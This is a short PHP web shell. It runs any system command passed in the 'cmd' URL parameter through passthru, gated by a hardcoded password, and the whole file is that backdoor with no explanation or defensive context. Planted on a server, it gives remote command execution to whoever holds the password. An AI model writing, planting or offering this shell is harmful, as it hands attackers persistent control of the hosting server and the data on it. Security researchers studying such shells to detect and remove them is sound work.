<?php
$PASSWORD = "lah";

if(isset($_GET['cmd']) && isset($_GET['pass'])){
    if($_GET['pass'] === $PASSWORD){
        $cmd = $_GET['cmd'];
        passthru($cmd);
    } else {
        echo "[DEENIED]";
    }
} else {
    echo "[MISSING PARAMETER]";
}
?>
